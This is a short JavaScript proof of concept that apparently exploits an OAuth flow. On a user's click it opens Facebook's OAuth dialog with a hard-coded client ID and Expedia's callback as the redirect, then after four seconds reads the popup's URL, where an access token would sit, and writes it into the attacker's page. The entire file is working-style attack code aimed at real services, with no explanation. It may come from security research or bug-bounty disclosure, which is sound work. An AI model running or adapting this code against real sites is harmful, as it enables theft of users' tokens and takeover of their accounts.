let newWindow;

document.addEventListener('DOMContentLoaded', () => {
    // Step 1: Wait for a click from the user
    document.addEventListener('click', () => {
        // Step 2: Open a new website
        newWindow = window.open('https://www.facebook.com/v11.0/dialog/oauth?response_type=token&client_id=131538103586818&scope=&state=ZhyqMqCCKLQNvk55xptAHaSr7lgajCFR4680nG-jV4M&redirect_uri=https://www.expedia.com/identity/api/v1/oauth2/callback/facebook-web', '_blank');

        // Step 3: After 4 seconds, grab the location.href from the new tab
        setTimeout(() => {
            if (newWindow && !newWindow.closed) {
                try {
                    const href = newWindow.location.href; // Grab the href from the new window
                    document.write(`The URL of the new tab is: ${href}`); // Write it on the opener tab
                } catch (e) {
                    console.error('Unable to access new window URL:', e);
                } finally {
                    newWindow.close(); // Step 4: Close the new tab
                }
            }
        }, 4000);
    }, { once: true }); // Ensure the event listener is only executed once
});